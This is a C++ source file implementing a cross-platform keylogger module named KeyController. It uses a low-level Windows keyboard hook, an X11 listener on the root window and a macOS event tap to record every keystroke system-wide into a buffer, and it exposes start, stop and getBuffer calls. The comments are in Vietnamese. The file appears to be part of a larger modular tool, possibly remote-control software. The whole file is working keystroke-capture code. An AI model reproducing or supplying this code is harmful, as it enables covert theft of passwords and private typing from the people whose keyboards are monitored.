#include "../../include/Modules/KeyController.h"

#ifdef _WIN32
#include <windows.h>
#include <thread>
#include <mutex>
#include <atomic>
namespace {
    std::string keyBuffer;
    std::mutex bufferMutex;
    std::thread msgThread;
    std::atomic<bool> running(false);
    HHOOK hKeyboardHook = nullptr;

    // **********************************************
    // * HÀM KEYCODETOCHAR ĐÃ ĐƯỢC CẬP NHẬT HOÀN TOÀN *
    // **********************************************
    std::string KeyCodeToChar(DWORD vkCode, KBDLLHOOKSTRUCT* pKey) {
        // 1. Lấy trạng thái bàn phím hiện tại (bao gồm Shift, Ctrl, Alt, Caps Lock)
        BYTE keyState[256];
        if (!GetKeyboardState(keyState)) return "";

        // 2. Dịch mã VK thành ký tự Unicode (WCHAR)
        WCHAR buffer[5];
        int result = ToUnicodeEx(
            vkCode,
            pKey->scanCode,
            keyState,
            buffer,
            _countof(buffer),
            0,
            GetKeyboardLayout(0)
        );

        if (result > 0) {
            // Chuyển đổi từ WCHAR (UTF-16) sang std::string (chỉ lấy ký tự đầu tiên nếu cần)
            return std::string(buffer, buffer + result);
        }

        // 3. Xử lý các phím đặc biệt không có ký tự in (ví dụ: Enter, Backspace)
        switch (vkCode) {
        case VK_RETURN: return "[ENTER]";
        case VK_SPACE: return " ";
        case VK_BACK: return "[BKSP]";
        case VK_TAB: return "[TAB]";
        case VK_LCONTROL:
        case VK_RCONTROL: return "[CTRL]";
        case VK_LSHIFT:
        case VK_RSHIFT: return "[SHIFT]";
        case VK_LMENU:
        case VK_RMENU: return "[ALT]";
        }

        // Bỏ qua các phím chức năng khác 
        return "";
    }

    LRESULT CALLBACK GlobalKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

            // * CÁCH GỌI HÀM CŨNG ĐƯỢC CẬP NHẬT *
            std::string s = KeyCodeToChar(pKey->vkCode, pKey);

            // Chỉ ghi vào buffer nếu có ký tự hợp lệ được dịch
            if (!s.empty()) {
                std::lock_guard<std::mutex> lock(bufferMutex);
                keyBuffer += s;
            }
        }
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }

    void runLoop() {
        // ... (Giữ nguyên phần này)
        hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, GlobalKeyboardProc, GetModuleHandle(nullptr), 0);
        MSG msg;
        running = true;
        while (running) {
            while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            Sleep(5);
        }
        if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = nullptr;
    }

    void StartWin() {
        running = true;
        msgThread = std::thread(runLoop);
        Sleep(100); // Đảm bảo thread khởi tạo xong
    }
    void StopWin() {
        running = false;
        if (msgThread.joinable()) msgThread.join();
    }
}
#endif

#ifdef __linux__
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <thread>
#include <mutex>
#include <atomic>
namespace {
    std::string keyBuffer;
    std::mutex bufferMutex;
    std::thread x11Thread;
    std::atomic<bool> running(false);
    void runLoop() {
        Display* dpy = XOpenDisplay(nullptr);
        if (!dpy) return;
        Window root = DefaultRootWindow(dpy);
        XSelectInput(dpy, root, KeyPressMask);
        while (running) {
            while (XPending(dpy)) {
                XEvent e;
                XNextEvent(dpy, &e);
                if (e.type == KeyPress) {
                    char buf[32];
                    KeySym ks;
                    int len = XLookupString(&e.xkey, buf, sizeof(buf), &ks, 0);
                    if (len > 0) {
                        std::lock_guard<std::mutex> lock(bufferMutex);
                        keyBuffer += buf[0];
                    }
                }
            }
            usleep(5000);
        }
        XCloseDisplay(dpy);
    }
    void StartLin() {
        running = true;
        x11Thread = std::thread(runLoop);
    }
    void StopLin() {
        running = false;
        if (x11Thread.joinable()) x11Thread.join();
    }
}
#endif

#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>
#include <thread>
#include <mutex>
#include <atomic>
namespace {
    std::string keyBuffer;
    std::mutex bufferMutex;
    std::thread macThread;
    std::atomic<bool> running(false);
    CFMachPortRef eventTap = nullptr;

    std::string KeyCodeToChar(CGKeyCode keycode) {
        if (keycode == 36) return "\n";
        if (keycode == 49) return " ";
        return "";
    }

    CGEventRef KeyEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void*) {
        if (type == kCGEventKeyDown) {
            CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
            std::string s = KeyCodeToChar(keycode);
            std::lock_guard<std::mutex> lock(bufferMutex);
            keyBuffer += s;
        }
        return event;
    }

    void runLoop() {
        eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0,
            CGEventMaskBit(kCGEventKeyDown), KeyEventCallback, nullptr);
        if (!eventTap) return;
        CFRunLoopSourceRef src = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes);
        CGEventTapEnable(eventTap, true);
        running = true;
        while (running) CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.005, false);
        CGEventTapEnable(eventTap, false);
        CFRunLoopRemoveSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes);
        CFRelease(src);
        CFRelease(eventTap);
    }

    void StartMac() {
        running = true;
        macThread = std::thread(runLoop);
        usleep(100000);
    }
    void StopMac() {
        running = false;
        if (macThread.joinable()) macThread.join();
    }
}
#endif

struct KeyController::Impl {
    Impl() = default;
};

KeyController::KeyController() : pImpl(new Impl) {}
KeyController::~KeyController() { delete pImpl; }

KeyController& KeyController::getInstance() {
    static KeyController inst;
    return inst;
}

bool KeyController::startCapture() {
#ifdef _WIN32
    StartWin();
    return true;
#elif defined(__linux__)
    StartLin();
    return true;
#elif defined(__APPLE__)
    StartMac();
    return true;
#endif
    return false;
}

bool KeyController::stopCapture() {
#ifdef _WIN32
    StopWin();
    return true;
#elif defined(__linux__)
    StopLin();
    return true;
#elif defined(__APPLE__)
    StopMac();
    return true;
#endif
    return false;
}

std::string KeyController::getBufferAndClear() {
#ifdef _WIN32
    std::lock_guard<std::mutex> lock(bufferMutex);
    std::string data = keyBuffer; keyBuffer.clear(); return data;
#elif defined(__linux__)
    std::lock_guard<std::mutex> lock(bufferMutex);
    std::string data = keyBuffer; keyBuffer.clear(); return data;
#elif defined(__APPLE__)
    std::lock_guard<std::mutex> lock(bufferMutex);
    std::string data = keyBuffer; keyBuffer.clear(); return data;
#else
    return "";
#endif
}



bool KeyControllerModule::start() {
    // delegate to your KeyController singleton
    return KeyController::getInstance().startCapture();
}

bool KeyControllerModule::stop() {
    return KeyController::getInstance().stopCapture();
}

std::string KeyControllerModule::getBuffer() {
    return KeyController::getInstance().getBufferAndClear();
}